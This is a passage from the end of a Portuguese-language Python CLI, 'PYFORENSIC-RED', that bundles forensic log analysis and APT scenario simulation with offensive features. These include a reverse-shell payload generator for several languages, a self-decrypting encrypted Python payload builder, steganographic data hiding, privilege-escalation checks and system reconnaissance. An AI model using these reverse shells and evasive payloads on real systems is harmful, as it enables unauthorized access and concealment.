                self.display_scan_results(results)
                
            except Exception as e:
                print(f"{self.colors['red']}Erro no scan: {e}{self.colors['end']}")
        
        else:
            print(f"{self.colors['red']}Opção inválida!{self.colors['end']}")
    
    def display_network_analysis(self, analysis: Dict):
        """Exibe análise de rede"""
        print(f"\n{self.colors['green']}📊 ANÁLISE DE PACOTES:{self.colors['end']}")
        
        # Protocolos
        if analysis['protocols']:
            print(f"\n{self.colors['cyan']}📡 PROTOCOLOS:{self.colors['end']}")
            for proto, count in analysis['protocols'].items():
                print(f"  • {proto}: {count}")
        
        # IPs
        if analysis['ips']:
            print(f"\n{self.colors['cyan']}🌐 TOP IPs:{self.colors['end']}")
            top_ips = sorted(analysis['ips'].items(), key=lambda x: x[1], reverse=True)[:5]
            for ip, count in top_ips:
                print(f"  • {ip}: {count} pacotes")
        
        # Portas
        if analysis['ports']:
            print(f"\n{self.colors['cyan']}🚪 TOP PORTAS:{self.colors['end']}")
            top_ports = sorted(analysis['ports'].items(), key=lambda x: x[1], reverse=True)[:5]
            for port, count in top_ports:
                print(f"  • {port}: {count}")
        
        # Atividades suspeitas
        if analysis['suspicious']:
            print(f"\n{self.colors['red']}⚠️  ATIVIDADES SUSPEITAS:{self.colors['end']}")
            for suspicious in analysis['suspicious'][:3]:
                print(f"  • {suspicious['pattern']}")
                print(f"    Pacote: {suspicious['packet']}")
    
    def display_scan_results(self, results: Dict):
        """Exibe resultados de scan"""
        print(f"\n{self.colors['green']}🎯 RESULTADOS DO SCAN:{self.colors['end']}")
        
        for host, info in results.items():
            print(f"\n{self.colors['cyan']}📍 {host} - {info['state']}{self.colors['end']}")
            
            if info.get('hostnames'):
                print(f"  Hostnames: {info['hostnames']}")
            
            if info.get('ports'):
                print(f"  Portas abertas:")
                for port, port_info in list(info['ports'].items())[:5]:  # Top 5
                    service = port_info.get('service', 'unknown')
                    version = port_info.get('version', '')
                    print(f"    • {port}/{service} {version}")
    
    def scenario_simulation(self):
        """Simulação de cenários"""
        print(f"\n{self.colors['cyan']}=== SIMULAÇÃO DE CENÁRIOS DE RED TEAM ==={self.colors['end']}")
        
        print("\nSelecione o grupo de ameaça para simular:")
        print("1. APT29 (Cozy Bear) - Governos/Think Tanks")
        print("2. Carbon Spider (FIN6) - Financeiro/Retail")
        print("3. Lazarus Group - Bancos/Criptomoedas")
        print("4. Todos os cenários")
        
        choice = input("\nSelecione: ").strip()
        
        scenarios_map = {
            '1': 'apt29',
            '2': 'carbon_spider',
            '3': 'lazarus'
        }
        
        if choice == '4':
            scenarios = ['apt29', 'carbon_spider', 'lazarus']
        elif choice in scenarios_map:
            scenarios = [scenarios_map[choice]]
        else:
            print(f"{self.colors['red']}Opção inválida!{self.colors['end']}")
            return
        
        print(f"\n{self.colors['yellow']}Simulando cenários...{self.colors['end']}")
        
        all_results = {}
        for scenario in scenarios:
            print(f"\n🎭 Simulando: {scenario.upper()}")
            results = self.analyzer.simulate_red_team_scenario(scenario)
            all_results[scenario] = results
        
        # Exibir resumo
        print(f"\n{self.colors['green']}✓ Simulação concluída!{self.colors['end']}")
        
        for scenario, results in all_results.items():
            scenario_info = results['scenario']
            print(f"\n{self.colors['cyan']}📋 {scenario_info['name']}{self.colors['end']}")
            print(f"  Descrição: {scenario_info['description']}")
            print(f"  TTPs simuladas: {len(scenario_info['ttps'])}")
            print(f"  Logs gerados: {len(results['simulated_logs'])}")
            
            if results['analysis'].get('anomalies'):
                print(f"  Anomalias detectadas: {len(results['analysis']['anomalies'])}")
        
        # Gerar relatório de simulação
        report = f"""
{'='*80}
RELATÓRIO DE SIMULAÇÃO DE RED TEAM
Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Cenários simulados: {', '.join(scenarios)}
{'='*80}

"""
        
        for scenario, results in all_results.items():
            scenario_info = results['scenario']
            report += f"""
CENÁRIO: {scenario_info['name']}
{'─'*40}
Descrição: {scenario_info['description']}
TTPs principais: {', '.join(scenario_info['ttps'])}
Indicadores: {', '.join(scenario_info['indicators'][:3])}

Análise IA:
  • Anomalias detectadas: {len(results['analysis'].get('anomalies', []))}
  • Padrões comportamentais: {len(results['analysis'].get('behavioral_patterns', []))}

"""
        
        report += f"""
{'='*80}
RECOMENDAÇÕES PARA DEFESA:
{'='*80}

1. Implementar detecção para as TTPs simuladas
2. Criar regras de SIEM baseadas nos indicadores
3. Realizar exercícios de Purple Team
4. Atualizar controles de segurança
5. Monitorar atividades similares aos cenários

{'='*80}
"""
        
        # Salvar relatório
        report_file = f"redteam_simulation_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(report_file, 'w') as f:
            f.write(report)
        
        print(f"\n{self.colors['cyan']}📄 Relatório de simulação salvo em: {report_file}{self.colors['end']}")
    
    def crypto_operations(self):
        """Operações criptográficas"""
        print(f"\n{self.colors['cyan']}=== OPERAÇÕES CRIPTOGRÁFICAS ==={self.colors['end']}")
        
        if not CRYPTO_AVAILABLE:
            print(f"\n{self.colors['red']}Cryptography não disponível!{self.colors['end']}")
            print("Instale: pip install cryptography")
            return
        
        print("\n1. Criptografar arquivo")
        print("2. Descriptografar arquivo")
        print("3. Gerar chaves")
        print("4. Criar payload auto-extraível")
        
        choice = input("\nSelecione: ").strip()
        
        if choice == '1':
            file_path = input("Caminho do arquivo: ").strip()
            if not os.path.exists(file_path):
                print(f"{self.colors['red']}Arquivo não encontrado!{self.colors['end']}")
                return
            
            password = input("Senha: ").strip()
            
            print(f"\n{self.colors['yellow']}Criptografando...{self.colors['end']}")
            
            try:
                key = CryptoOps.generate_aes_key(password)
                encrypted_file = CryptoOps.encrypt_file(file_path, key)
                
                if encrypted_file:
                    print(f"{self.colors['green']}✓ Arquivo criptografado: {encrypted_file}{self.colors['end']}")
                    print(f"{self.colors['yellow']}⚠️  Salve esta chave para descriptografar:{self.colors['end']}")
                    print(f"{key.decode()}")
                else:
                    print(f"{self.colors['red']}Erro na criptografia!{self.colors['end']}")
            
            except Exception as e:
                print(f"{self.colors['red']}Erro: {e}{self.colors['end']}")
        
        elif choice == '2':
            file_path = input("Caminho do arquivo criptografado: ").strip()
            if not os.path.exists(file_path):
                print(f"{self.colors['red']}Arquivo não encontrado!{self.colors['end']}")
                return
            
            key_input = input("Chave (em base64): ").strip()
            
            print(f"\n{self.colors['yellow']}Descriptografando...{self.colors['end']}")
            
            try:
                key = key_input.encode()
                decrypted_file = CryptoOps.decrypt_file(file_path, key)
                
                if decrypted_file:
                    print(f"{self.colors['green']}✓ Arquivo descriptografado: {decrypted_file}{self.colors['end']}")
                else:
                    print(f"{self.colors['red']}Erro na descriptografia!{self.colors['end']}")
            
            except Exception as e:
                print(f"{self.colors['red']}Erro: {e}{self.colors['end']}")
        
        elif choice == '3':
            print(f"\n{self.colors['yellow']}Gerando chaves...{self.colors['end']}")
            
            # Gerar chave Fernet
            key = Fernet.generate_key()
            print(f"\n{self.colors['green']}✅ CHAVE FERNET GERADA:{self.colors['end']}")
            print(f"{key.decode()}")
            
            # Gerar par de chaves RSA
            try:
                from cryptography.hazmat.primitives.asymmetric import rsa
                from cryptography.hazmat.primitives import serialization
                
                private_key = rsa.generate_private_key(
                    public_exponent=65537,
                    key_size=2048
                )
                
                private_pem = private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption()
                )
                
                public_key = private_key.public_key()
                public_pem = public_key.public_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PublicFormat.SubjectPublicKeyInfo
                )
                
                print(f"\n{self.colors['green']}✅ CHAVE PRIVADA RSA:{self.colors['end']}")
                print(private_pem.decode()[:200] + "...")
                
                print(f"\n{self.colors['green']}✅ CHAVE PÚBLICA RSA:{self.colors['end']}")
                print(public_pem.decode())
                
            except Exception as e:
                print(f"{self.colors['red']}Erro ao gerar RSA: {e}{self.colors['end']}")
        
        elif choice == '4':
            print("\nCriar payload Python auto-extraível/auto-descritografável")
            code = input("Código Python para embutir (deixe vazio para exemplo): ").strip()
            
            if not code:
                code = '''
print("Hello from encrypted payload!")
import socket
print(f"Hostname: {socket.gethostname()}")
'''
            
            password = input("Senha para criptografia: ").strip()
            
            print(f"\n{self.colors['yellow']}Criando payload...{self.colors['end']}")
            
            try:
                # Criptografar código
                key = CryptoOps.generate_aes_key(password)
                fernet = Fernet(key)
                encrypted = fernet.encrypt(code.encode())
                
                # Criar payload
                payload = CryptoOps.create_self_decrypting_payload(encrypted, key)
                
                # Salvar
                payload_file = f"payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py"
                with open(payload_file, 'w') as f:
                    f.write(payload)
                
                print(f"{self.colors['green']}✓ Payload criado: {payload_file}{self.colors['end']}")
                print(f"{self.colors['yellow']}⚠️  Execute com: python {payload_file}{self.colors['end']}")
                
            except Exception as e:
                print(f"{self.colors['red']}Erro: {e}{self.colors['end']}")
        
        else:
            print(f"{self.colors['red']}Opção inválida!{self.colors['end']}")
    
    def post_exploitation(self):
        """Operações de pós-exploração (SIMULADAS)"""
        print(f"\n{self.colors['cyan']}=== OPERAÇÕES DE PÓS-EXPLORAÇÃO (SIMULADAS) ==={self.colors['end']}")
        print(f"{self.colors['red']}⚠️  AVISO: Esta é uma simulação para fins educacionais{self.colors['end']}")
        print(f"{self.colors['red']}⚠️  Use apenas em ambientes autorizados!{self.colors['end']}")
        
        print("\n1. Coletar informações do sistema")
        print("2. Verificar vetores de privesc")
        print("3. Dump de credenciais (simulado)")
        print("4. Gerar reverse shell payload")
        
        choice = input("\nSelecione: ").strip()
        
        if choice == '1':
            print(f"\n{self.colors['yellow']}Coletando informações do sistema...{self.colors['end']}")
            
            try:
                info = PostExploitation.gather_system_info()
                
                print(f"\n{self.colors['green']}✅ INFORMAÇÕES DO SISTEMA:{self.colors['end']}")
                
                print(f"\n{self.colors['cyan']}💻 SISTEMA:{self.colors['end']}")
                for key, value in info['system'].items():
                    print(f"  • {key}: {value}")
                
                print(f"\n{self.colors['cyan']}🌐 REDE:{self.colors['end']}")
                for iface, addrs in info['network'].items():
                    print(f"  • {iface}: {addrs}")
                
                print(f"\n{self.colors['cyan']}👥 USUÁRIOS:{self.colors['end']}")
                for user in info['users'][:10]:
                    print(f"  • {user}")
                
                print(f"\n{self.colors['cyan']}⚙️  PROCESSOS (top 5):{self.colors['end']}")
                for proc in info['processes'][:5]:
                    print(f"  • PID {proc.get('pid')}: {proc.get('name')} ({proc.get('username')})")
                
            except Exception as e:
                print(f"{self.colors['red']}Erro: {e}{self.colors['end']}")
        
        elif choice == '2':
            print(f"\n{self.colors['yellow']}Verificando vetores de escalação de privilégio...{self.colors['end']}")
            
            try:
                vectors = PostExploitation.check_privesc_vectors()
                
                if vectors:
                    print(f"\n{self.colors['red']}⚠️  VETORES DE PRIVESC ENCONTRADOS:{self.colors['end']}")
                    for vector in vectors:
                        print(f"\n{self.colors['cyan']}▶ {vector['vector']}{self.colors['end']}")
                        print(f"  Saída: {vector['output'][:200]}...")
                else:
                    print(f"\n{self.colors['green']}✓ Nenhum vetor óbvio encontrado{self.colors['end']}")
                
            except Exception as e:
                print(f"{self.colors['red']}Erro: {e}{self.colors['end']}")
        
        elif choice == '3':
            print(f"\n{self.colors['red']}🚫 FUNÇÃO SIMULADA - Nenhuma credencial real será extraída{self.colors['end']}")
            print(f"{self.colors['yellow']}Em um ambiente real, isso tentaria extrair:{self.colors['end']}")
            print("  • Hashes do SAM (Windows)")
            print("  • Arquivos de senhas do Linux")
            print("  • Tickets Kerberos")
            print("  • Chaves SSH")
            print("  • Credenciais em navegadores")
            
            # Simular resultado
            print(f"\n{self.colors['green']}[SIMULAÇÃO] Credenciais encontradas:{self.colors['end']}")
            print("  • admin:NTLM_HASH_SIMULATED")
            print("  • root:SHADOW_HASH_SIMULATED")
            print("  • SSH key: RSA_PRIVATE_KEY_SIMULATED")
        
        elif choice == '4':
            print(f"\n{self.colors['cyan']}🔙 GERADOR DE REVERSE SHELL{self.colors['end']}")
            
            lhost = input("Seu IP (LHOST): ").strip()
            lport = input("Porta (LPORT) [4444]: ").strip() or "4444"
            
            print("\nSelecione o tipo de payload:")
            print("1. Linux (bash)")
            print("2. Python")
            print("3. PowerShell (Windows)")
            print("4. PHP")
            print("5. Todos")
            
            payload_choice = input("\nSelecione: ").strip()
            
            payloads_map = {
                '1': 'linux',
                '2': 'python',
                '3': 'powershell',
                '4': 'php'
            }
            
            if payload_choice == '5':
                platforms = ['linux', 'python', 'powershell', 'php', 'perl', 'ruby']
            elif payload_choice in payloads_map:
                platforms = [payloads_map[payload_choice]]
            else:
                platforms = ['linux']
            
            print(f"\n{self.colors['green']}✅ PAYLOADS GERADOS:{self.colors['end']}")
            
            for platform_type in platforms:
                payload = NetworkOperatives.create_reverse_shell_payload(lhost, int(lport), platform_type)
                print(f"\n{self.colors['cyan']}▶ {platform_type.upper()}:{self.colors['end']}")
                print(payload)
            
            print(f"\n{self.colors['yellow']}⚠️  Use com responsabilidade!{self.colors['end']}")
        
        else:
            print(f"{self.colors['red']}Opção inválida!{self.colors['end']}")
    
    def steganography_ops(self):
        """Operações de esteganografia"""
        print(f"\n{self.colors['cyan']}=== ESTEGANOGRAFIA ==={self.colors['end']}")
        
        try:
            from PIL import Image
        except ImportError:
            print(f"\n{self.colors['red']}PIL/Pillow não disponível!{self.colors['end']}")
            print("Instale: pip install pillow")
            return
        
        print("\n1. Esconder dados em imagem")
        print("2. Extrair dados de imagem")
        
        choice = input("\nSelecione: ").strip()
        
        if choice == '1':
            image_path = input("Caminho da imagem: ").strip()
            if not os.path.exists(image_path):
                print(f"{self.colors['red']}Imagem não encontrada!{self.colors['end']}")
                return
            
            data_type = input("Tipo de dados (1-texto, 2-arquivo): ").strip()
            
            if data_type == '1':
                text = input("Texto para esconder: ").strip()
                data = text.encode()
            elif data_type == '2':
                file_path = input("Caminho do arquivo: ").strip()
                if not os.path.exists(file_path):
                    print(f"{self.colors['red']}Arquivo não encontrado!{self.colors['end']}")
                    return
                
                with open(file_path, 'rb') as f:
                    data = f.read()
            else:
                print(f"{self.colors['red']}Tipo inválido!{self.colors['end']}")
                return
            
            output_path = f"hidden_{os.path.basename(image_path)}"
            
            print(f"\n{self.colors['yellow']}Escondendo dados...{self.colors['end']}")
            
            success = Steganography.hide_in_png(image_path, data, output_path)
            
            if success:
                print(f"{self.colors['green']}✓ Dados escondidos em: {output_path}{self.colors['end']}")
            else:
                print(f"{self.colors['red']}Erro ao esconder dados!{self.colors['end']}")
        
        elif choice == '2':
            image_path = input("Caminho da imagem com dados escondidos: ").strip()
            if not os.path.exists(image_path):
                print(f"{self.colors['red']}Imagem não encontrada!{self.colors['end']}")
                return
            
            print(f"\n{self.colors['yellow']}Extraindo dados...{self.colors['end']}")
            
            data = Steganography.extract_from_png(image_path)
            
            if data:
                try:
                    # Tentar decodificar como texto
                    text = data.decode('utf-8', errors='ignore')
                    if len(text) > 10 and any(c.isprintable() for c in text):
                        print(f"\n{self.colors['green']}✅ DADOS EXTRAÍDOS (texto):{self.colors['end']}")
                        print(text[:500] + ("..." if len(text) > 500 else ""))
                    else:
                        print(f"\n{self.colors['green']}✅ DADOS EXTRAÍDOS (binário):{self.colors['end']}")
                        print(f"Tamanho: {len(data)} bytes")
                        
                        # Salvar como arquivo
                        output_file = f"extracted_{datetime.now().strftime('%Y%m%d_%H%M%S')}.bin"
                        with open(output_file, 'wb') as f:
                            f.write(data)
                        print(f"📁 Salvo em: {output_file}")
                except:
                    print(f"\n{self.colors['green']}✅ DADOS EXTRAÍDOS:{self.colors['end']}")
                    print(f"Tamanho: {len(data)} bytes")
            else:
                print(f"{self.colors['red']}Nenhum dado encontrado na imagem!{self.colors['end']}")
        
        else:
            print(f"{self.colors['red']}Opção inválida!{self.colors['end']}")
    
    def artifact_management(self):
        """Gerenciamento de artefatos"""
        print(f"\n{self.colors['cyan']}=== GERENCIAMENTO DE ARTEFATOS ==={self.colors['end']}")
        
        # Diretório padrão de artefatos
        artifacts_dir = "./pyforensic_artifacts"
        os.makedirs(artifacts_dir, exist_ok=True)
        
        print("\n1. Listar artefatos")
        print("2. Limpar artefatos antigos")
        print("3. Compactar artefatos")
        print("4. Verificar integridade")
        
        choice = input("\nSelecione: ").strip()
        
        if choice == '1':
            print(f"\n{self.colors['yellow']}ARTEFATOS EM {artifacts_dir}:{self.colors['end']}")
            
            files = []
            for root, dirs, filenames in os.walk(artifacts_dir):
                for filename in filenames:
                    filepath = os.path.join(root, filename)
                    files.append(filepath)
            
            if not files:
                print(f"{self.colors['red']}Nenhum artefato encontrado!{self.colors['end']}")
                return
            
            # Agrupar por tipo
            file_types = defaultdict(list)
            for filepath in files:
                ext = os.path.splitext(filepath)[1].lower()
                file_types[ext].append(filepath)
            
            for ext, file_list in file_types.items():
                print(f"\n{self.colors['cyan']}{ext or 'sem extensão'}:{self.colors['end']}")
                for filepath in sorted(file_list)[:5]:  # Top 5 por tipo
                    size = os.path.getsize(filepath)
                    mtime = datetime.fromtimestamp(os.path.getmtime(filepath))
                    print(f"  • {os.path.basename(filepath)} ({size:,} bytes, {mtime:%Y-%m-%d})")
                
                if len(file_list) > 5:
                    print(f"  ... e mais {len(file_list) - 5} arquivos")
            
            print(f"\n{self.colors['green']}Total: {len(files)} artefatos{self.colors['end']}")
        
        elif choice == '2':
            days = input("Excluir arquivos mais antigos que (dias) [30]: ").strip()
            days = int(days) if days.isdigit() else 30
            
            cutoff_time = datetime.now() - timedelta(days=days)
            deleted = 0
            
            for root, dirs, filenames in os.walk(artifacts_dir):
                for filename in filenames:
                    filepath = os.path.join(root, filename)
                    mtime = datetime.fromtimestamp(os.path.getmtime(filepath))
                    
                    if mtime < cutoff_time:
                        try:
                            os.remove(filepath)
                            deleted += 1
                            print(f"{self.colors['yellow']}🗑️  Excluído: {os.path.basename(filepath)}{self.colors['end']}")
                        except Exception as e:
                            print(f"{self.colors['red']}Erro ao excluir {filename}: {e}{self.colors['end']}")
            
            print(f"\n{self.colors['green']}✓ Excluídos {deleted} artefatos antigos{self.colors['end']}")
        
        elif choice == '3':
            archive_name = f"artifacts_{datetime.now().strftime('%Y%m%d_%H%M%S')}.tar.gz"
            
            print(f"\n{self.colors['yellow']}Compactando artefatos para {archive_name}...{self.colors['end']}")
            
            try:
                with tarfile.open(archive_name, "w:gz") as tar:
                    tar.add(artifacts_dir, arcname="artifacts")
                
                size = os.path.getsize(archive_name)
                print(f"{self.colors['green']}✓ Compactado: {archive_name} ({size:,} bytes){self.colors['end']}")
                
            except Exception as e:
                print(f"{self.colors['red']}Erro na compactação: {e}{self.colors['end']}")
        
        elif choice == '4':
            print(f"\n{self.colors['yellow']}Verificando integridade dos artefatos...{self.colors['end']}")
            
            integrity_issues = []
            
            for root, dirs, filenames in os.walk(artifacts_dir):
                for filename in filenames:
                    filepath = os.path.join(root, filename)
                    
                    try:
                        # Calcular hash
                        hasher = hashlib.sha256()
                        with open(filepath, 'rb') as f:
                            while chunk := f.read(8192):
                                hasher.update(chunk)
                        
                        file_hash = hasher.hexdigest()
                        
                        # Verificar extensões suspeitas
                        ext = os.path.splitext(filename)[1].lower()
                        suspicious_exts = ['.exe', '.dll', '.bat', '.ps1', '.sh']
                        
                        if ext in suspicious_exts:
                            integrity_issues.append({
                                'file': filename,
                                'issue': f'Extensão suspeita: {ext}',
                                'hash': file_hash[:16]
                            })
                        
                        # Verificar tamanho muito grande
                        size = os.path.getsize(filepath)
                        if size > 100 * 1024 * 1024:  # 100MB
                            integrity_issues.append({
                                'file': filename,
                                'issue': f'Tamanho excessivo: {size:,} bytes',
                                'hash': file_hash[:16]
                            })
                    
                    except Exception as e:
                        integrity_issues.append({
                            'file': filename,
                            'issue': f'Erro ao verificar: {e}',
                            'hash': 'ERROR'
                        })
            
            if integrity_issues:
                print(f"\n{self.colors['red']}⚠️  PROBLEMAS DE INTEGRIDADE:{self.colors['end']}")
                for issue in integrity_issues:
                    print(f"  • {issue['file']}: {issue['issue']} (hash: {issue['hash']})")
            else:
                print(f"\n{self.colors['green']}✓ Todos os artefatos estão íntegros{self.colors['end']}")
        
        else:
            print(f"{self.colors['red']}Opção inválida!{self.colors['end']}")
    
    def show_help(self):
        """Exibe ajuda"""
        help_text = f"""
{self.colors['cyan']}{self.colors['bold']}╔══════════════════════════════════════════════════════════╗{self.colors['end']}
{self.colors['cyan']}{self.colors['bold']}║                      AJUDA - PYFORENSIC-RED               ║{self.colors['end']}
{self.colors['cyan']}{self.colors['bold']}╚══════════════════════════════════════════════════════════╝{self.colors['end']}

{self.colors['yellow']}📖 SOBRE:{self.colors['end']}
Ferramenta avançada de análise forense e simulação de Red Team
com integração MITRE ATT&CK, IA/ML e técnicas de ofensa.

{self.colors['yellow']}⚠️  AVISOS IMPORTANTES:{self.colors['end']}
1. Use apenas em ambientes autorizados
2. Conheça e siga as leis locais
3. Obtenha permissão por escrito
4. Use apenas para defesa e pesquisa ética

{self.colors['yellow']}🔧 FUNCIONALIDADES PRINCIPAIS:{self.colors['end']}

{self.colors['cyan']}[1] Análise Forense Avançada{self.colors['end']}
  • Parse de logs multiplataforma
  • Detecção de IOCs
  • Análise temporal
  • Preservação de evidências

{self.colors['cyan']}[2] Detecção de TTPs{self.colors['end']}
  • Mapeamento MITRE ATT&CK
  • Detecção de técnicas de Red Team
  • Análise de cadeia de ataque
  • Geração de IOCs

{self.colors['cyan']}[3] Análise de Cadeia de Ataque{self.colors['end']}
  • Kill Chain analysis
  • Attack graph construction
  • Network relationship analysis
  • Central node identification

{self.colors['cyan']}[4] Análise com IA/ML{self.colors['end']}
  • Detecção de anomalias
  • Clusterização de eventos
  • Análise comportamental
  • Predictive analytics

{self.colors['cyan']}[5] Análise de Rede{self.colors['end']}
  • Packet sniffing
  • Network scanning
  • Protocol analysis
  • Suspicious activity detection

{self.colors['cyan']}[6] Simulação de Cenários{self.colors['end']}
  • APT29 (Cozy Bear)
  • Carbon Spider (FIN6)
  • Lazarus Group
  • Custom scenarios

{self.colors['cyan']}[7] Operações Criptográficas{self.colors['end']}
  • File encryption/decryption
  • Key generation
  • Self-decrypting payloads
  • Secure data hiding

{self.colors['cyan']}[8] Pós-Exploração (Simulado){self.colors['end']}
  • System information gathering
  • Privilege escalation vectors
  • Credential dumping (simulated)
  • Reverse shell generation

{self.colors['cyan']}[9] Esteganografia{self.colors['end']}
  • Hide data in images
  • Extract hidden data
  • LSB steganography
  • Data concealment

{self.colors['cyan']}[0] Gerenciamento de Artefatos{self.colors['end']}
  • Artifact listing
  • Cleanup of old files
  • Compression
  • Integrity checking

{self.colors['yellow']}📁 ESTRUTURA DE DIRETÓRIOS:{self.colors['end']}
./pyforensic_artifacts/      # Artefatos gerados
./attack_analysis/           # Relatórios de ataque
./forensic_results/          # Resultados forenses

{self.colors['yellow']}🔐 SEGURANÇA:{self.colors['end']}
• Todas as operações são registradas
• Hashes são calculados para integridade
• Configurações sensíveis são protegidas
• Use com responsabilidade!

{self.colors['red']}🚨 DISCLAIMER: O uso indevido desta ferramenta é crime.{self.colors['end']}
{self.colors['red']}   Use apenas para defesa, pesquisa autorizada e educação.{self.colors['end']}
"""
        print(help_text)

def main():
    """Função principal"""
    parser = argparse.ArgumentParser(
        description='PYFORENSIC-RED: Ferramenta Avançada de Análise Forense e Red Team',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
⚠️  AVISO LEGAL:
Esta ferramenta é apenas para uso em ambientes autorizados.
O uso não autorizado é ilegal e antiético.
O desenvolvedor não se responsabiliza por uso indevido.

📞 Reporte problemas: security-team@example.com

Exemplos de uso:
  %(prog)s --cli                    # Interface interativa
  %(prog)s --analyze access.log     # Análise forense
  %(prog)s --ttp-detect logs.txt    # Detecção de TTPs
  %(prog)s --simulate apt29         # Simulação de cenário
        """
    )
    
    parser.add_argument('--cli', action='store_true', help='Iniciar interface CLI interativa')
    parser.add_argument('--analyze', metavar='FILE', help='Analisar arquivo de log')
    parser.add_argument('--ttp-detect', metavar='FILE', help='Detectar TTPs em arquivo')
    parser.add_argument('--simulate', choices=['apt29', 'carbon_spider', 'lazarus'], 
                       help='Simular cenário de Red Team')
    parser.add_argument('--output', '-o', help='Diretório de saída')
    parser.add_argument('--config', '-c', help='Arquivo de configuração')
    parser.add_argument('--verbose', '-v', action='store_true', help='Modo verbose')
    parser.add_argument('--quiet', '-q', action='store_true', help='Modo silencioso')
    
    args = parser.parse_args()
    
    # Configurar logging
    if args.quiet:
        logging.getLogger().setLevel(logging.ERROR)
    elif args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Verificar se estamos em ambiente seguro
    def check_environment():
        """Verifica se o ambiente é adequado"""
        import getpass
        user = getpass.getuser()
        
        if user == 'root' or user == 'Administrator':
            logger.warning(f"Executando como {user} - tenha cuidado!")
        
        # Verificar variáveis de ambiente
        safe_env_vars = ['PYTHONPATH', 'PATH', 'HOME', 'USER']
        for key, value in os.environ.items():
            if key.upper() not in safe_env_vars and 'PASS' in key.upper():
                logger.warning(f"Variável de ambiente sensível detectada: {key}")
    
    check_environment()
    
    # Executar conforme argumentos
    if args.cli:
        cli = RedTeamCLI()
        cli.run()
    
    elif args.analyze:
        analyzer = AdvancedLogAnalyzer(args.config)
        # Implementar análise de arquivo
        
    elif args.ttp_detect:
        analyzer = AdvancedLogAnalyzer(args.config)
        # Implementar detecção de TTPs
        
    elif args.simulate:
        analyzer = AdvancedLogAnalyzer(args.config)
        results = analyzer.simulate_red_team_scenario(args.simulate)
        
        print(f"\n🎭 Simulação {args.simulate} concluída!")
        print(f"📊 Logs gerados: {len(results['simulated_logs'])}")
        print(f"🎯 TTPs simuladas: {len(results['scenario']['ttps'])}")
        
        # Salvar resultados
        if args.output:
            output_dir = Path(args.output)
            output_dir.mkdir(exist_ok=True)
            
            with open(output_dir / f"simulation_{args.simulate}.json", 'w') as f:
                json.dump(results, f, indent=2, default=str)
            
            print(f"📁 Resultados salvos em: {output_dir}")
    
    else:
        # Se nenhum argumento, mostrar ajuda
        parser.print_help()
        
        # Perguntar se quer iniciar CLI
        response = input("\nIniciar interface CLI? (s/N): ").strip().lower()
        if response == 's':
            cli = RedTeamCLI()
            cli.run()

if __name__ == "__main__":
    main()